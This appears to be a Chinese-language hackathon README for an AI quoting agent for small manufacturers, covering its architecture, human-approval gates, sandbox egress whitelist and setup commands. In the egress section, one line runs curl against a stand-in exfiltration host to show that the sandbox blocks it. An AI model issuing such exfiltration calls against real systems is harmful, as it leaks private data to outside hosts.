# 桐聚 GatherEase · AI 報價詢價 Agent

> **NVIDIA Agent Hackathon · 2026/05** — 用 **OpenClaw + Nemotron + NemoClaw** 打造的 AI 報價詢價 Agent。

**Slogan：流程交給 AI，決策留給老闆。**
*AI handles the process. You make the call.*

---

## 開場故事

> 小時候全家出門旅遊，我爸爸的電話總是響個不停。每一通，都是公司報價的姊姊打來問他：「這張單，A 客戶要算多少？」「這個，B 客戶報多少？」那時候我不懂——為什麼爸爸連出去玩，都要一直接電話、按計算機？
>
> 長大後我才明白：全台灣，有多少個像我爸爸一樣的中小企業老闆，每天都在重複上演一模一樣的事，一天好多次。

這些中小企業，正是支撐全世界 AI 供應鏈的核心。但當你真正走進這些工廠，會發現一個落差：**外面的世界已經是 AI 的速度，而支撐它的根基，還停留在手動接電話、手動按計算機、手動翻舊報價的日常。最先進的供應鏈，跑在最費力的流程上。**

報價詢價的繁瑣，是台灣製造業「**選擇客製化求生、小單多樣**」所換來的必然負擔。這個 agent，就是讓「客製化求生」這條路，走得更輕、更快、更穩。

---

## 為什麼這個題目對 NVIDIA 有意義

NemoClaw 的存在目的，是拆掉企業「**不敢讓 AI 自己跑**」的心理障礙。

台灣中小製造業是這層心理障礙最厚的群體之一：客製化求生、每一張單都是命脈、報價詢價裡有客戶機密、廠商名單、成本配方——**資料一旦外流，產業關係立刻崩盤**。

這份 demo 證明：連這麼怕資料外洩的場景，也能靠 NemoClaw 安全地導入 autonomous agent——把 agent 推進它原本進不去、卻又是台灣供應鏈根基的巨大市場。

---

## 核心賣點：資料留在工廠，模型來工廠

製造業老闆一定會問：「我的成本表、圖面會不會被送上雲端、被拿去訓練？」答案是——**不會，而且「資料不出廠」正是這套架構的設計目的**。

**產品形態**：Nemotron 用 NVIDIA NIM 自架在工廠本地 GPU（on-prem），OpenClaw daemon 在本地，NemoClaw 的 egress policy 直接禁止成本／圖面對外連線。資料一步都不出廠。

**Demo 階段誠實說明**：因無本地 GPU，推理暫走雲端 Nemotron 端點；但 NemoClaw 的 egress policy 在 demo 裡**就真的在擋**對外資料外送——治理是真的，產品形態是本地 NIM。

> **不是資料去雲端，是模型來工廠。**

---

## 架構

```
┌─ 老闆 LINE ────┐     ┌─ Linux VM (未來 DGX Spark on-prem) ────────┐
│                │◄──►│  NemoClaw (OpenShell 沙盒 + kernel egress)  │
└────────────────┘     │   └─ OpenClaw daemon                        │
                       │       └─ orchestrator.js (確定性流程)        │
                       │           ├─ engineer agent (工程判讀)        │
                       │           ├─ planner agent (生管)             │
                       │           └─ quote agent (報價主)             │
                       │       推理：Nemotron Nano + Super              │
┌─ 廠商 / 客戶 ──┐     │       資料：data/*.json + *.csv（合成）       │
│  Gmail SMTP    │◄──►│       稽核：logs/audit.jsonl                  │
│  IMAP test     │     └────────────────────────────────────────────┘
└────────────────┘
```

### 為什麼用 Node.js orchestrator 不用 `sessions_spawn`？

OpenClaw 內建 `sessions_spawn` 是「LLM 自決何時 spawn」的非確定性機制（spawn 深度預設 1、最多 2），每次跑可能不一樣——對要錄影、要治理稽核的我們是風險。

**我們的做法**：三個 agent 用 OpenClaw 多 agent 設定（`agents.list[]`）定義成各自獨立、各有工具權限的 agent，但用 **Node.js orchestrator 確定性地照順序呼叫**。每次跑都一樣，demo 穩，也好治理。

### 三個 agent 對應工廠真實角色

| Agent | 對應角色 | 模型 | 職責 |
|---|---|---|---|
| `engineer` | 工程師 | Nemotron Super | 讀工程圖、判定 BOM、定採購／代工／自製 |
| `planner` | 生管 | Nemotron Super | 查產線排程、評估交期可達性 |
| `quote` | 報價員 | Super (內呼 Nano) | 算成本、比價、產生報價、加密寄出 |

**雙模型分工**踩 NVIDIA AI-Q Open Agent Blueprint：Nano 處理輕任務（讀 PDF 抓欄位、分類），Super 做深度判斷（讀圖、權衡、套機密偵測）。

---

## Tool Calling 三分類（比賽硬性要求）

| 類別 | 性質 | 工具 |
|---|---|---|
| **INPUT** | 讀取、自動 | `read_drawing`、`get_purchase_price`、`get_material_price`、`get_history_quote`（加權相似度找 top-K 歷史訂單）、`check_schedule` |
| **CONTROL** | 計算、可逆、受護欄 | `calc_cost`、`compare_suppliers`、`detect_secret_probe` |
| **OUTPUT** | 對外、不可逆、人類把關 | `send_rfq`、`encrypt_quote`、`send_quote`、`archive_quote` |

---

## NemoClaw 五道守門

**Demo 演 3 道（人話、有共鳴）：**

1. **擋下套機密的人** — 客戶／廠商來信打聽成本或廠商名單，agent 偵測後擋下不在報價單回答（agent 保護老闆）。
2. **多維權衡討論** — 價／期／質 trade-off 攤老闆討論，AI 算、人決定。
3. **最終報價真人簽核** — 對外送出前老闆親自確認（不可逆動作）。

**系統保留 2 道（log 一行帶過，計入治理佔比）：**

4. 對外發送圖面前確認廠商白名單。
5. 惡意郵件 prompt injection 防禦。

### 護城河是「整個治理架構」，不是單一守門

評審可能會說：「圖面／成本／簽核用 if-else 也能做。」差別不在能不能擋，在 **agent 被 prompt injection 攻陷時還擋不擋得住**。if-else 跟 agent 同程序、會一起被繞過；NemoClaw 在 OpenShell 沙盒**外**、kernel 層強制執行 egress policy（seccomp + Landlock + network namespace），agent 改不掉自己的規則。所有守門都防得住內部失控——這才是護城河。

完整政策見 [`presets/gatherease-egress.yaml`](./presets/gatherease-egress.yaml)。

### Deployment Note: NemoClaw 需要 Ubuntu 24.04（不是 22.04）

NemoClaw 的 `openshell-gateway` 二進位需要 **glibc 2.38+**。我們最初用 Brev 預配的 NemoClaw launchable（Ubuntu 22.04 / glibc 2.35）卡在 sandbox image build Step 18/62（NVIDIA Issue #3456 已記錄此 incompatibility）。**Pivot 到 Ubuntu 24.04（glibc 2.39）後一次過關**。

**Ubuntu 24.04 VM 上的完整驗證紀錄：**

```
[1/8] Preflight: ✓ Docker / OpenShell 0.0.44 / 4 vCPU / 15.6 GiB RAM
[2/8] OpenShell gateway: ✓ Docker-driver healthy
[3/8] Inference: ✓ NVIDIA Endpoints, Nemotron 3 Super 120B
[4/8] Provider nvidia-prod created · inference.local route active
[5/8] Messaging: skipped (LINE 用自訂 webhook、不走內建 channel)
[6/8] Sandbox image build: ✓ 74 of 74 steps in 383s
[7/8] OpenClaw gateway launched inside sandbox
[8/8] Policy presets applied (Balanced tier)
═══ NemoClaw is ready ═══
Sandbox: gatherease-quote-agent  ·  Phase: Ready  ·  Policy version: 10
```

**完整 enforced egress whitelist**（內建 + 我們自訂、`openshell policy get --full` 驗證）：

| 來源 | host | 用途 |
|---|---|---|
| 內建 `nvidia` | `integrate.api.nvidia.com:443` | Nemotron API（POST `/v1/chat/completions`、GET `/v1/models`） |
| 內建 `managed_inference` | `inference.local:443` | sandbox 經 OpenShell gateway 走 inference |
| 內建 `npm/pypi/brew/huggingface/brave` | 對應 registry 端點 | Balanced tier 預設 |
| **自訂 `line-messaging`** | `api.line.me:443`、`api-data.line.me:443` REST | LINE flex message push / webhook |
| **自訂 `gmail-smtp`** | `smtp.gmail.com:587/465` raw TCP | 對外發詢價信、加密報價單 |
| **自訂 `gmail-imap`** | `imap.gmail.com:993` raw TCP | 收代工廠回信 |

**Whitelist 外**：sandbox 內試 `curl https://evil-data-exfil.example.com/` 回 `CONNECT tunnel failed, response 403` — NemoClaw kernel-level 真的擋。這個是 demo 影片裡「治理是真的」的 2-3 秒 b-roll 鏡頭素材。

**自訂 preset YAML 位置**：[`presets/`](./presets/) 三個檔（[`line-messaging.yaml`](./presets/line-messaging.yaml) / [`gmail-smtp.yaml`](./presets/gmail-smtp.yaml) / [`gmail-imap.yaml`](./presets/gmail-imap.yaml)），格式對齊 [NVIDIA NemoClaw 官方 schema](https://docs.nvidia.com/nemoclaw/latest/network-policy/customize-network-policy.html)。

**部署一鍵指令**（給未來重現用，假設 Ubuntu 24.04 host + Docker + Node 22）：

```bash
curl -fsSL https://www.nvidia.com/nemoclaw.sh | bash
# 接互動 prompts：NVIDIA Endpoints → Nemotron Super 120B → 貼 API key
# → 沙盒名 gatherease-quote-agent → Brave/messaging 都 N → Apply Y
sudo ufw allow from 172.18.0.0/16 to 172.18.0.1 port 8080 proto tcp
nemoclaw gatherease-quote-agent policy-add --from-dir ./presets/ --yes
```

---

## 怎麼跑

### 環境分工：Mac 開發 + Linux VM 跑真 NemoClaw

NemoClaw 的隔離靠 **Linux kernel 三機制**（seccomp、Landlock LSM、network namespace），macOS 沒這些 API——只能用 Docker Desktop 模擬，不給同等隔離保證。所以採：

| 工作 | 在哪 |
|---|---|
| 寫 code / orchestrator / skill / HTML 介面 | **Mac** |
| 錄 demo 影片（HTML + 穿插 VM 終端機） | **Mac** |
| OpenClaw + Nemotron + NemoClaw 真實運行 | **Linux VM**（本案用 NVIDIA Brev 提供的 launchable） |

### 0. 前置需求

**Mac（開發機）**
- Node.js LTS（建議 22+）
- 編輯器、git

**Linux VM（跑真治理）**
- Ubuntu 22.04+、≥ 8GB RAM、Docker、Node.js 22+
- 推薦：[NVIDIA Brev NemoClaw launchable](https://brev.nvidia.com/launchable/deploy/now?launchableID=env-3Azt0aYgVNFEuz7opyx3gscmowS)（NemoClaw + OpenShell 預裝）

**雲端服務**
- NVIDIA API Key — [build.nvidia.com](https://build.nvidia.com)
- 一個測試 Gmail 帳號（**不要**用主帳號）
- 一個 LINE Messaging API Channel — [developers.line.biz/console](https://developers.line.biz/console)

### 1. 在 Linux VM 上裝 NemoClaw（不是用 Brev launchable 的話）

> ⚠️ **NemoClaw 不是 npm 套件**——npm 上同名 `nemoclaw` 0.1.0 是別人佔名的 222 bytes 空殼，跟 NVIDIA 無關。
> 官方來源：[github.com/NVIDIA/NemoClaw](https://github.com/NVIDIA/NemoClaw)（Apache 2.0、2026/03/16 GTC 發表、early preview）

```bash
# 一行裝（自動裝 Node.js 缺項、跑 onboard 精靈建沙盒 / 設推理 / 套政策）
curl -fsSL https://www.nvidia.com/nemoclaw.sh | bash

# 非互動 onboard
NEMOCLAW_POLICY_TIER=open nemoclaw onboard --non-interactive --yes-i-accept-third-party-software
```

### 2. 安裝 OpenClaw

```bash
sudo npm install -g openclaw@latest
openclaw onboard --non-interactive \
  --mode local \
  --auth-choice apiKey \
  --gateway-port 18789 \
  --gateway-bind loopback \
  --install-daemon \
  --daemon-runtime node
```

### 3. 套用本案 egress 政策

```bash
nemoclaw gatherease-quote-agent policy-add --from-file ./presets/gatherease-egress.yaml
```

### 4. 設環境變數

```bash
cp .env.example .env
# 編輯 .env，填入 NVIDIA_API_KEY、LINE token、Gmail App Password
```

### 5. 安裝 Node 相依 + 跑 demo

```bash
npm install

# 端到端跑一次，所有 HOLD 點老闆 mock approve
npm run demo

# 帶套機密信件，演 gate-1 攔截
npm run demo:secret

# 個別 skill 測試
npm run test:read-drawing
npm run test:calc-cost
npm run test:send-rfq
```

### 6. 看治理稽核軌跡

```bash
cat logs/audit.jsonl | jq '.'
```

---

## Repo 結構

```
gatherease-quote-agent/
├─ README.md                      # 你正在讀的這份
├─ CLAUDE.md                      # Claude Code session 上下文
├─ orchestrator.js                # Node.js 確定性流程主腳本
├─ package.json
├─ openclaw.json.template         # OpenClaw 設定範本（真實版不進 git）
├─ skills/                        # 各能力 skill 模組
│  ├─ read_drawing/               # engineer agent · 讀圖判讀（含 GatherRoller 知識庫）
│  ├─ calc_cost/                  # quote agent · 算成本（純函數，可重現）
│  ├─ send_rfq/                   # quote agent · 發詢價（OUTPUT，觸發守門）
│  └─ get_history_quote/          # quote agent · 加權相似度找歷史訂單參考
├─ data/                          # 合成資料（synthetic data）
│  ├─ products.json               # 包膠鐵輪 BOM
│  ├─ suppliers.json              # 全鋼 / 永鎵 / 新鎏鍍
│  ├─ customers.json              # 鴻碩電子等
│  ├─ cost_rates.json             # 成本費率（overhead / markup）
│  ├─ schedule.json               # 產線排程
│  ├─ historical_orders.csv       # 10,000 筆合成歷史訂單（GatherEase 25.01 AI Agent generate_orders.py 產出）
│  └─ bom_cost_data.csv           # 26 種 compound 的單位成本表
├─ presets/
│  └─ gatherease-egress.yaml      # NemoClaw 政策（顯眼擺，這是護城河）
├─ logs/
│  └─ .gitkeep                    # 治理稽核軌跡會寫到這裡
├─ showcase/
│  ├─ factory-quote-demo.html     # 互動式 demo 原型（錄影主畫面）
│  └─ slide-data-sovereignty.html # 「模型來工廠」投影片
└─ docs/
   └─ 桐聚_AI報價Agent_專案藍圖.docx  # 完整提案藍圖
```

---

## 合成資料聲明

本 repo 所有資料（產品 BOM、客戶、供應商、報價、排程、歷史訂單）**皆為合成示意，非桐聚 GatherEase 或達洲精密的真實企業資料**。`data/historical_orders.csv` 的 10,000 筆訂單是用 GatherEase 早期專案 `generate_orders.py` 腳本產生的合成資料；產品類型（包膠鐵輪／橡膠滾輪）真實存在於台灣中部精密機械業，數字與名稱皆為虛構。

---

## 金鑰安全

- `.env`、`openclaw.json` 已在 `.gitignore`，**絕對不要 commit 真實金鑰**。
- Gmail 務必用「專門測試帳號」，不要用主帳號（agent 自動收發會被 Google 濫用偵測標記）。

---

## Demo 影片

📹 **3 分鐘 demo 影片**：（Day 4 錄製、上傳後填入連結）

---

## 結論：人機分工

| 計算 Calculation | 建議 Recommendation | 決斷 Judgment |
|---|---|---|
| AI 做：拆 BOM、算成本、彙整比價 | AI 輔助：這家可砍、這客戶建議讓利 | 人決定：砍不砍、報多少、送不送出 |

讓幾千個像我爸爸一樣的中小企業老闆，把繁瑣的詢價、溝通、彙整、計算交給 AI，拿到最佳定價策略分析，**做生意的決策權交回他們手上**。

**資料留工廠、模型來工廠、人類最後把關**——讓台灣最核心的產業鏈，跨過敢用 agent 的門檻。

---

## 致謝

- **NVIDIA**：Nemotron 模型、NemoClaw 治理參考堆疊、AI-Q Open Agent Blueprint、Brev 雲端 VM
- **Peter Steinberger / OpenClaw**：編排框架
- **桐聚 GatherEase 團隊**：產品與市場洞察、25.01 AI Agent 專案的合成 dummy data 與 `similarity_checker.py`

> 本案由桐聚科技以「一個人 + 多個 AI agent」協作完成——不只做 agent demo，是親身在用這套方法工作。

---

**License：** MIT
